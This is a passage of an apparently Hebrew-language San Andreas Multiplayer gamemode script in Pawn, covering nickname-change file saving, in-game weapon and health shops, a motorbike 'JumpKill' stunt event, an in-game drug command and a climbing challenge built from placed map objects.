format(string,sizeof(string),"Colt=%d\r\n",PlayerInfo[playerid][Colt]); fwrite(f,string);
format(CheackNick,sizeof(CheackNick),"ICQ=%s\r\n",sicq); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Msn=%s\r\n",smsn); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Mispht=%s\r\n",smispht); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"SEX=%s\r\n",ssex); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Email=%s\r\n",semail); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"Agg=%s\r\n",PlayerInfo[playerid][AggInfo]); fwrite(f,CheackNick);
format(CheackNick,sizeof(CheackNick),"ClanLvl=%d\r\n",ClanGever[playerid]); fwrite(f,CheackNick);
fclose(f);
}
PlayerInfo[playerid][Logged] = 0;
PlayerInfo[playerid][Logged] = 0;
format(string, sizeof(string), ".--- %s הכינוי שלך השתנה בהצלחה ל",newnick);
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "%s :משתמש",newnick);
SendClientMessage(playerid, COLOR_ORANGE, string);
format(string, sizeof(string), "%s :סיסמה",savepass);
SendClientMessage(playerid, COLOR_ORANGE, string);
PlayerInfo[playerid][Logged] = 0;
if(pia[playerid][CarID] != 0)
{
new FileCar[256];
format(FileCar,sizeof(FileCar),"Car/car%d.ini", pia[playerid][CarID]);
dini_Set(FileCar,"CarOwner",newnick);
VehicleInfo[pia[playerid][CarID]][CarOwned] = 1;
strmid(VehicleInfo[pia[playerid][CarID]][CarOwner], newnick, 0, strlen(newnick), 255);
VehicleInfo[pia[playerid][CarID]][Buyable] = 0;
SaveFiles();
PlayerInfo[playerid][Logged] = 0;
PlayerInfo[playerid][FL] = 0;
Kick(playerid);
}
else
{
SetPlayerName(playerid,newnick);
PlayerInfo[playerid][Logged] = 0;
PlayerInfo[playerid][FL] = 0;
Kick(playerid);
}
return 1;
}
if(!strcmp(cmd, "/unINV", true))
{
if(!IsPlayerXAdmin(playerid,1)) return 0;
SetPlayerColor(playerid,sgba2hex(random(256),random(256),random(256),77));//צבע במפה

SendClientMessage(playerid, WHITE,".כעת יצאת ממצב שקיפות");
Invis[playerid] =0;
return 1;
}



if(!strcmp(cmd,"/scam",true) || !strcmp(cmd,"/scamrea",true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
new Roy_Killer1111[256];
Roy_Killer1111= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer1111)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer1111)) return SendClientMessage(playerid, WHITE, "Usage: /scam [1/2]");

if(strcmp(Roy_Killer1111,"1",true) == 0)
{
SetPlayerCameraPos(playerid,-1097.9583,-1459.1655,127.4298);
SetPlayerCameraLookAt(playerid,-1097.7699,-1468.2634,126.2569);
SetTimerEx("behiend",6000,0,"i",playerid);
return true;
}

else if(strcmp(Roy_Killer1111,"2",true) == 0)
{
SetPlayerCameraPos(playerid,-2419.8503,2796.7444,181.8570);
SetPlayerCameraLookAt(playerid,-2420.2661,2802.6987,178.5689);
SetTimerEx("behiend",6000,0,"i",playerid);
return true;
}

return SendClientMessage(playerid,red,".מצלמה שגויה");
}

if(!strcmp(cmd,"/swl",true) || !strcmp(cmd,"/sweaponlist",true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
if(!CPS_IsPlayerInCheckpoint(playerid,AmmunationS1) && !CPS_IsPlayerInCheckpoint(playerid,AmmunationS2) &&!CPS_IsPlayerInCheckpoint(playerid,AmmunationS3))
{
SendClientMessage(playerid, red, ".על מנת לבצע פקודה זאת אלייך להיות בחנות הנשקים הסודיים");
return 1;
}
SendClientMessage(playerid,lblue,"~~~ (Weapon List Sercet Ammunation) רשימת נשקים סודיים");
SendClientMessage(playerid,COLOR_YELLOW,"(1) Katna ($1000) (ammo: 1) (level: 2) || (2) Bat ($1000) (ammo: 1) (level: 3)");
SendClientMessage(playerid,COLOR_YELLOW,"(3) Knife ($1500) (ammo: 1) (level: 5) || (4) Chiansaw ($4000) (ammo: 1) (level: 9)");
SendClientMessage(playerid,COLOR_YELLOW,"(5) Fire ($6000) (ammo: alot) (level: 11) || (5) Flame ($8000) (ammo: alot) (level: 15)");
return true;
}

if(!strcmp(cmd,"/sbarmour",true) || !strcmp(cmd,"/sba",true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
if(!CPS_IsPlayerInCheckpoint(playerid,AmmunationS1) && !CPS_IsPlayerInCheckpoint(playerid,AmmunationS2) &&!CPS_IsPlayerInCheckpoint(playerid,AmmunationS3))
{
SendClientMessage(playerid, red, ".על מנת לבצע פקודה זאת אלייך להיות בחנות הנשקים הסודיים");
return 1;
}
if(GetPlayerMoney(playerid) < 50) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
SetPlayerArmour(playerid,100.0);
SendClientMessage(playerid,LIGHTGREEN,".קנית מגן לא תמידי בהצלחה");
LACY_GiveMoney(playerid,-50);
return true;
}

if(!strcmp(cmd,"/sbhealth",true) || !strcmp(cmd,"/sbh",true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
if(!CPS_IsPlayerInCheckpoint(playerid,AmmunationS1) && !CPS_IsPlayerInCheckpoint(playerid,AmmunationS2) &&!CPS_IsPlayerInCheckpoint(playerid,AmmunationS3))
{
SendClientMessage(playerid, red, ".על מנת לבצע פקודה זאת אלייך להיות בחנות הנשקים הסודיים");
return 1;
}
if(GetPlayerMoney(playerid) < 50) return SendClientMessage(playerid,red,".אין לך מספיק כסף");
SetPlayerHealth(playerid,100.0);
SendClientMessage(playerid,LIGHTGREEN,".קנית חיים לא תמידיים בהצלחה");
LACY_GiveMoney(playerid,-50);
return true;
}

if(!strcmp(cmd,"/sbw",true) || !strcmp(cmd,"/sBuyWeapon",true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
if(!CPS_IsPlayerInCheckpoint(playerid,AmmunationS1) && !CPS_IsPlayerInCheckpoint(playerid,AmmunationS2) &&!CPS_IsPlayerInCheckpoint(playerid,AmmunationS3))
{
SendClientMessage(playerid, red, ".על מנת לבצע פקודה זאת אלייך להיות בחנות הנשקים הסודיים");
return 1;
}
new Roy_Killer1111[256];
Roy_Killer1111= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer1111)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer1111))
{
SendClientMessage(playerid, WHITE, "Usage: /sbw [1-6]");
return 1;
}


else if(strcmp(Roy_Killer1111,"1",true) == 0)
{
if(GetPlayerMoney(playerid) < 1000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-1000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Katana קנית את הנשק");
GivePlayerWeapon(playerid,8,1);
return 1;
}

else if(strcmp(Roy_Killer1111,"2",true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(GetPlayerMoney(playerid) < 1000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-1000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Bat Baseball קנית את הנשק");
GivePlayerWeapon(playerid,5,1);
return 1;
}

else if(strcmp(Roy_Killer1111,"3",true) == 0)
{
if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
if(GetPlayerMoney(playerid) < 1500) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-1500);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Knife קנית את הנשק");
GivePlayerWeapon(playerid,4,1);
return 1;
}

else if(strcmp(Roy_Killer1111,"4",true) == 0)
{
if(PlayerInfo[playerid][Level] < 9) return Messagelevel(playerid,9);
if(GetPlayerMoney(playerid) < 4000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-4000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Chiansaw קנית את הנשק");
GivePlayerWeapon(playerid,9,1);
return 1;
}


else if(strcmp(Roy_Killer1111,"5",true) == 0)
{
if(PlayerInfo[playerid][Level] < 11) return Messagelevel(playerid,11);
if(GetPlayerMoney(playerid) < 6000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-6000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Fire קנית את הנשק");
GivePlayerWeapon(playerid,42,1);
return 1;
}

else if(strcmp(Roy_Killer1111,"6",true) == 0)
{
if(PlayerInfo[playerid][Level] < 15) return Messagelevel(playerid,15);
if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
LACY_GiveMoney(playerid,-8000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"Flame קנית את הנשק");
GivePlayerWeapon(playerid,37,1000);
return 1;
}

return SendClientMessage(playerid,red,".נשק שגוי");
}

if(!strcmp(cmd,"/bw",true) || !strcmp(cmd,"/BuyWeapon",true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,Ammu))
{
SendClientMessage(playerid, red, ".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
return 1;
}
new Roy_Killer1111[256];
Roy_Killer1111= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer1111)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer1111))
{
SendClientMessage(playerid, WHITE, "Usage: /BW [1-12]");
return 1;
}


else if(strcmp(Roy_Killer1111,"1",true) == 0)
{
if(GetPlayerMoney(playerid) < 50000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][Sawn] +=100;
dini_IntSet(GetPlayerFile(playerid),"Sawn",PlayerInfo[playerid][Sawn]);
GivePlayerWeapon(playerid,26,PlayerInfo[playerid][Sawn]);
LACY_GiveMoney(playerid,-50000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Sawnoff Shotgun) ,קנית 100 כדורים לנשק");
return 1;
}

else if(strcmp(Roy_Killer1111,"2",true) == 0)
{
if(GetPlayerMoney(playerid) < 25000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][MicroSMG] +=100;
dini_IntSet(GetPlayerFile(playerid),"MicroSMG",PlayerInfo[playerid][MicroSMG]);
GivePlayerWeapon(playerid,28,PlayerInfo[playerid][MicroSMG]);
LACY_GiveMoney(playerid,-25000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (MicroSMG) ,קנית 100 כדורים לנשק");
return 1;
}

else if(strcmp(Roy_Killer1111,"3",true) == 0)
{
if(GetPlayerMoney(playerid) < 25000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][Tec9] +=100;
dini_IntSet(GetPlayerFile(playerid),"Tec9",PlayerInfo[playerid][Tec9]);
GivePlayerWeapon(playerid,32,PlayerInfo[playerid][Tec9]);
LACY_GiveMoney(playerid,-25000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Tec9) ,קנית 100 כדורים לנשק");
return 1;
}
else if(strcmp(Roy_Killer1111,"4",true) == 0)
{
if(GetPlayerMoney(playerid) < 20000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][M4] +=100;
dini_IntSet(GetPlayerFile(playerid),"M4",PlayerInfo[playerid][M4]);
GivePlayerWeapon(playerid,31,PlayerInfo[playerid][M4]);
LACY_GiveMoney(playerid,-20000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (M4) ,קנית 100 כדורים לנשק");

return 1;
}
else if(strcmp(Roy_Killer1111,"5",true) == 0)
{
if(GetPlayerMoney(playerid) < 30000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][MP5] +=100;
dini_IntSet(GetPlayerFile(playerid),"MP5",PlayerInfo[playerid][MP5]);
GivePlayerWeapon(playerid,29,PlayerInfo[playerid][MP5]);
LACY_GiveMoney(playerid,-30000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (MP5) ,קנית 100 כדורים לנשק");
return 1;
}

else if(strcmp(Roy_Killer1111,"6",true) == 0)
{
if(GetPlayerMoney(playerid) < 30000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][AK47] +=100;
dini_IntSet(GetPlayerFile(playerid),"AK47",PlayerInfo[playerid][AK47]);
GivePlayerWeapon(playerid,30,PlayerInfo[playerid][AK47]);
LACY_GiveMoney(playerid,-30000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (AK47) ,קנית 100 כדורים לנשק");
return 1;
}


else if(strcmp(Roy_Killer1111,"7",true) == 0)
{
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][Knife] = 1;
dini_IntSet(GetPlayerFile(playerid),"Knife",PlayerInfo[playerid][Knife]);
GivePlayerWeapon(playerid,4,PlayerInfo[playerid][Knife]);
LACY_GiveMoney(playerid,-10000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Knife) ,קנית את החרב");
return 1;
}
else if(strcmp(Roy_Killer1111,"8",true) == 0)
{
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][Katana] = 1;
dini_IntSet(GetPlayerFile(playerid),"Katana",PlayerInfo[playerid][Katana]);
GivePlayerWeapon(playerid,8,PlayerInfo[playerid][Katana]);
LACY_GiveMoney(playerid,-10000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Katana) ,קנית את החרב");
return 1;
}

else if(strcmp(Roy_Killer1111,"9",true) == 0)
{
if(GetPlayerMoney(playerid) < 35000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][CombatShotGun] +=20;
dini_IntSet(GetPlayerFile(playerid),"CombatShotGun",PlayerInfo[playerid][CombatShotGun]);
GivePlayerWeapon(playerid,27,PlayerInfo[playerid][CombatShotGun]);
LACY_GiveMoney(playerid,-35000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (CombatShotGun) ,קנית 20 כדורים לנשק");
return 1;
}
else if(strcmp(Roy_Killer1111,"10",true) == 0)
{
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][ShotGun] +=20;
dini_IntSet(GetPlayerFile(playerid),"ShotGun",PlayerInfo[playerid][ShotGun]);
GivePlayerWeapon(playerid,25,PlayerInfo[playerid][ShotGun]);
LACY_GiveMoney(playerid,-10000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Shotgun) ,קנית 20 כדורים לנשק");
return 1;
}
else if(strcmp(Roy_Killer1111,"11",true) == 0)
{
if(GetPlayerMoney(playerid) < 50000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][CRifle] +=3;
dini_IntSet(GetPlayerFile(playerid),"CRifle",PlayerInfo[playerid][CRifle]);
GivePlayerWeapon(playerid,34,PlayerInfo[playerid][CRifle]);
LACY_GiveMoney(playerid,-50000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Sniper Rifle) ,קנית 3 כדורים לנשק");
return 1;
}
else if(strcmp(Roy_Killer1111,"12",true) == 0)
{
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,red,"!אין לך מספיק כסף לנשק זה");
PlayerInfo[playerid][Colt] +=120;
dini_IntSet(GetPlayerFile(playerid),"Colt",PlayerInfo[playerid][Colt]);
GivePlayerWeapon(playerid,22,PlayerInfo[playerid][Colt]);
LACY_GiveMoney(playerid,-10000);
new rand = random(sizeof(playerColors));
SendClientMessage(playerid,playerColors[rand],".בהצלחה (Pistol mm9) ,קנית 120 כדורים לנשק");
return 1;
}

return 1;
}

//=[JumpKill]
        if (strcmp("/jumpkill", cmdtext, true) == 0)
        {
        if(PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
		if(RaceJumpKill != -1) return SendClientMessage(playerid, WHITE, ".קפיצת ההתאבדות תפוסה כרגע, המתן שהשחקן יסיים יסיים");
        if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,WHITE,".אתה צריך כ10,000 דולר JumpKill-על מנת לפתוח ב");
LACY_GiveMoney(playerid,-10000);
format(string,sizeof(string),".JumpKill - יצא למשימת ההתאבדות %s :השחקן", GetName(playerid) );
SendClientMessageToAll(red,string);
                RaceJumpKill = playerid;
                Motor = CreateVehicle(BikeModel, 424.0586,2502.778076,16.2115, 90.0000, 0, 6, -1);
		        PutPlayerInVehicle(playerid, Motor, 0);
                SetCameraBehindPlayer(playerid);
                TimerJumpkill1 = SetTimer("CountkilljumpJumpKill", 1000, 1);
                GameTextForPlayer(RaceJumpKill, "~b~5", 3000, 6);
                TogglePlayerControllable(playerid, 0);
                Countkilljump = 0;
                Distance = 0.0;

  DestroyPlayerObject2[1]=      CreatePlayerObject(RaceJumpKill,1655, 54.348621, 2502.778076, 16.792294, 0.0000, 0.0000, 90.0000);
  DestroyPlayerObject2[2]=      CreatePlayerObject(RaceJumpKill,979, 61.964684, 2510.659912, 16.324594, 0.0000, 0.0000, 225.0000);
   DestroyPlayerObject2[3]=        CreatePlayerObject(RaceJumpKill,979, 68.574669, 2517.179688, 16.324594, 0.0000, 0.0000, 224.1406);
   DestroyPlayerObject2[4]=        CreatePlayerObject(RaceJumpKill,979, 74.838379, 2523.267090, 16.324594, 0.0000, 0.0000, 224.1406);
  DestroyPlayerObject2[5]=         CreatePlayerObject(RaceJumpKill,978, 61.268669, 2494.687256, 16.324594, 0.0000, 0.0000, 303.7500);
  DestroyPlayerObject2[6]=         CreatePlayerObject(RaceJumpKill,978, 66.452194, 2486.926514, 16.324594, 0.0000, 0.0000, 303.7500);
  DestroyPlayerObject2[7]=         CreatePlayerObject(RaceJumpKill,978, 71.637367, 2479.152832, 16.324596, 0.0000, 0.0000, 303.7500);
  DestroyPlayerObject2[8]=         CreatePlayerObject(RaceJumpKill,982, 37.394611, 2497.127930, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[9]=         CreatePlayerObject(RaceJumpKill,982, 37.501751, 2508.678711, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[10]=         CreatePlayerObject(RaceJumpKill,982, 11.898752, 2508.676514, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[11]=         CreatePlayerObject(RaceJumpKill,982, 11.785603, 2497.133789, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[12]=         CreatePlayerObject(RaceJumpKill,982, -13.819443, 2497.136475, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[13]=         CreatePlayerObject(RaceJumpKill,982, -13.738670, 2508.645752, 16.175739, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[14]=         CreatePlayerObject(RaceJumpKill,982, -39.338737, 2508.623291, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[15]=         CreatePlayerObject(RaceJumpKill,982, -64.946236, 2508.630859, 16.175737, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[16]=         CreatePlayerObject(RaceJumpKill,982, -39.422119, 2497.141602, 16.167931, 0.0000, 0.0000, 270.0000);
  DestroyPlayerObject2[17]=        CreatePlayerObject(RaceJumpKill,982, -65.034653, 2497.131348, 16.167931, 0.0000, 0.0000, 270.0000);
    DestroyPlayerObject2[18]=       CreatePlayerObject(RaceJumpKill,3461, -77.754257, 2508.626709, 17.059387, 0.0000, 0.0000, 0.0000);
   DestroyPlayerObject2[19]=        CreatePlayerObject(RaceJumpKill,3461, -77.824821, 2497.134033, 17.240005, 0.0000, 0.0000, 0.0000);
   DestroyPlayerObject2[20]=        CreatePlayerObject(RaceJumpKill,3461, -60.153984, 2508.603760, 17.067196, 0.0000, 0.0000, 0.0000);
   DestroyPlayerObject2[21]=        CreatePlayerObject(RaceJumpKill,3461, -60.245415, 2497.100830, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[22]=         CreatePlayerObject(RaceJumpKill,3461, -42.536339, 2508.615723, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[23]=         CreatePlayerObject(RaceJumpKill,3461, -42.645630, 2497.122314, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[24]=         CreatePlayerObject(RaceJumpKill,3461, -24.953836, 2508.633301, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[25]=         CreatePlayerObject(RaceJumpKill,3461, -25.054081, 2497.136963, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[26]=         CreatePlayerObject(RaceJumpKill,3461, -7.358308, 2508.621338, 17.067196, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[27]=         CreatePlayerObject(RaceJumpKill,3461, -7.405560, 2497.130371, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[28]=         CreatePlayerObject(RaceJumpKill,3461, 10.270878, 2508.671143, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[29]=         CreatePlayerObject(RaceJumpKill,3461, 10.190086, 2497.112305, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[30]=         CreatePlayerObject(RaceJumpKill,3461, 27.894892, 2508.682861, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[31]=         CreatePlayerObject(RaceJumpKill,3461, 27.788519, 2497.122070, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[32]=         CreatePlayerObject(RaceJumpKill,3461, 45.501919, 2508.674316, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[33]=         CreatePlayerObject(RaceJumpKill,3461, 45.367653, 2497.103027, 17.059387, 0.0000, 0.0000, 0.0000);
  DestroyPlayerObject2[34]=         CreatePlayerObject(RaceJumpKill,3568, -49.846252, 2485.552002, 18.097994, 0.0000, 0.0000, 213.7501);
  DestroyPlayerObject2[35]=         CreatePlayerObject(RaceJumpKill,3568, 23.495960, 2515.677979, 18.097994, 0.0000, 0.0000, 90.0001);
  DestroyPlayerObject2[36]=         CreatePlayerObject(RaceJumpKill,3566, -56.099358, 2517.848389, 18.097994, 0.0000, 0.0000, 303.7500);
  DestroyPlayerObject2[37]=         CreatePlayerObject(RaceJumpKill,3819, -37.348824, 2512.810303, 16.482134, 0.0000, 0.0000, 90.0000);
  DestroyPlayerObject2[38]=         CreatePlayerObject(RaceJumpKill,3819, -28.746914, 2512.851074, 16.482134, 0.0000, 0.0000, 90.0000);
  DestroyPlayerObject2[39]=         CreatePlayerObject(RaceJumpKill,3819, -20.126209, 2512.839844, 16.489943, 0.0000, 0.0000, 90.0000);
  DestroyPlayerObject2[40]=         CreatePlayerObject(RaceJumpKill,3819, -11.508772, 2512.832764, 16.489943, 0.0000, 0.0000, 90.0000);
  DestroyPlayerObject2[41]=         CreatePlayerObject(RaceJumpKill,3819, -37.340233, 2493.169189, 16.482134, 0.0000, 0.0000, 270.0000);
   DestroyPlayerObject2[42]=        CreatePlayerObject(RaceJumpKill,3819, -28.750528, 2493.177734, 16.482134, 0.0000, 0.0000, 270.0000);
    DestroyPlayerObject2[43]=       CreatePlayerObject(RaceJumpKill,3819, -20.152523, 2493.154785, 16.482134, 0.0000, 0.0000, 270.0000);
   DestroyPlayerObject2[44] =        CreatePlayerObject(RaceJumpKill,3819, -11.532024, 2493.193115, 16.482134, 0.0000, 0.0000, 270.0000);

                return 1;
        }

        if (strcmp("/stopjumpkill", cmdtext, true) == 0)
        {
                if(PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
		if(RaceJumpKill != playerid) return SendClientMessage(playerid,WHITE,".אתה לא נמצא בקפיצת המוות");
            EndJumpKill();
            TogglePlayerControllable(playerid, 1);
            return 1;
        }

        if ((strcmp("/jumpkillscore", cmdtext, true) == 0))
        {
//                new str[128];
SendClientMessage(playerid, red, ":רשימת האנשים שעשו את קפיצה ההתאבדות בצורה הטובה ביותר");
format(str, 128, "#1:   %.4f     %s", HS[0], HSN[0]);
SendClientMessage(playerid, COLOR_PINK, str);
format(str, 128, "#2:   %.4f     %s", HS[1], HSN[1]);
SendClientMessage(playerid, COLOR_PINK, str);
format(str, 128, "#3:   %.4f     %s", HS[2], HSN[2]);
SendClientMessage(playerid, COLOR_PINK, str);
format(str, 128, "%.4f :השיא שלך", dini_Float(PERSONALFILE, GetName(playerid)));
SendClientMessage(playerid, COLOR_PINK, str);
return 1;
}

if (strcmp(cmdtext, "/useweed", true)==0)
{
//new str[256];
if(Stoned[playerid] == 1)return SendClientMessage(playerid, WHITE, " אתה עדיין תחת השפעת הסמים ");


if(PlayerInfo[playerid][Weeds] > 0)
{
PlayerInfo[playerid][Weeds] --;
format(str, sizeof(str), ".השתמת במנת סמים, נשאר לך %d/10 מנות ", PlayerInfo[playerid][Weeds]);

TheWeed[playerid] =1;
Stoned[playerid]=1;
SetPlayerWantedLevel(playerid,1);
ApplyAnimation(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
}
else
{
format(str, sizeof(str), ".אין לך אף מנת סמים");
SendClientMessage(playerid, red, str);
}
return 1;
}

//===============================ChaStart Command===============================
if(!strcmp(cmd, "/startCha", true))
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
if(ChaOn == 1) return SendClientMessage(playerid, WHITE, ".יש כבר האתגר טיפוס פעילה ");
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/Cha~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
for(new i = 0; i < MAX_PLAYERS; i++) {
}
ChaPras  = 3000;
SetTimer("ChaStarted",3000,0);



//[Challenge]============================================================

CheDelObject[0] = CreateStreamObject(1696, 1769.081299, -2475.579346, 13.561917, 0.0000, 0.0000, 180.0000,100);
CheDelObject[1] =CreateStreamObject(1894, 1770.736694, -2480.442383, 11.954697, 359.1406, 2.5783, 101.2500,100);
CheDelObject[2] =CreateStreamObject(1894, 1775.860718, -2506.013184, 13.112448, 359.1406, 10.3132, 101.2500,100);
CheDelObject[3] =CreateStreamObject(5152, 1780.142212, -2534.805908, 20.779951, 0.0000, 0.0000, 270.0000,100);
CheDelObject[4] =CreateStreamObject(13604, 1776.118408, -2548.626709, 22.604872, 0.8594, 356.5623, 278.6717,100);
CheDelObject[5] =CreateStreamObject(13636, 1781.736084, -2545.876221, 26.592197, 0.0000, 0.0000, 281.2500,100);
CheDelObject[6] =CreateStreamObject(13638, 1777.057251, -2541.441650, 30.043570, 0.8594, 17.1887, 11.2500,100);
CheDelObject[7] =CreateStreamObject(13638, 1771.777100, -2555.157471, 36.419189, 0.0000, 19.7670, 90.8595,100);
CheDelObject[8] =CreateStreamObject(13647, 1758.082153, -2539.003418, 40.517815, 0.0000, 0.0000, 112.5000,100);
CheDelObject[9] =CreateStreamObject(18262, 1748.788940, -2517.121582, 43.027180, 0.0000, 0.0000, 22.5000,100);
CheDelObject[10] =CreateStreamObject(18367, 1746.841919, -2512.927490, 41.922482, 0.0000, 0.0000, 213.7500,100);
CheDelObject[11] =CreateStreamObject(18367, 1736.853882, -2496.445557, 45.156380, 0.0000, 12.8916, 306.3284,100);
CheDelObject[12] =CreateStreamObject(18367, 1714.320679, -2515.731445, 48.742352, 0.0000, 352.2651, 218.1245,100);
CheDelObject[13] =CreateStreamObject(18367, 1701.230713, -2496.107178, 51.958038, 0.0000, 12.8916, 306.3284,100);
CheDelObject[14] =CreateStreamObject(18609, 1692.528931, -2503.911133, 54.147449, 0.0000, 0.0000, 315.0000,100);
CheDelObject[15] =CreateStreamObject(18609, 1709.177612, -2509.929688, 50.836823, 0.0000, 0.0000, 30.1576,100);
CheDelObject[16] =CreateStreamObject(18367, 1678.757324, -2515.343994, 55.317616, 0.0000, 0.0000, 213.7500,100);
CheDelObject[17] =CreateStreamObject(18367, 1676.555054, -2511.261719, 58.896374, 351.4056, 0.0000, 213.7500,100);
CheDelObject[18] =CreateStreamObject(18367, 1664.081177, -2493.852051, 58.155533, 351.4056, 0.0000, 213.7500,100);
CheDelObject[19] =CreateStreamObject(18367, 1661.992310, -2489.944580, 65.772484, 347.1084, 0.0000, 213.7500,100);
CheDelObject[20] =CreateStreamObject(18367, 1646.171021, -2467.510010, 75.243423, 347.1084, 0.0000, 168.7500,100);
CheDelObject[21] =CreateStreamObject(18367, 1647.679688, -2470.190918, 65.190323, 330.7792, 0.0000, 168.7500,100);
CheDelObject[22] =CreateStreamObject(13638, 1657.328979, -2442.719727, 84.871346, 0.8594, 17.1887, 260.3826,100);
CheDelObject[23] =CreateStreamObject(18367, 1652.083618, -2438.176025, 88.640350, 347.1084, 0.0000, 168.7500,100);
CheDelObject[24] =CreateStreamObject(13638, 1668.809814, -2436.662109, 93.845680, 0.8594, 17.1887, 282.8826,100);
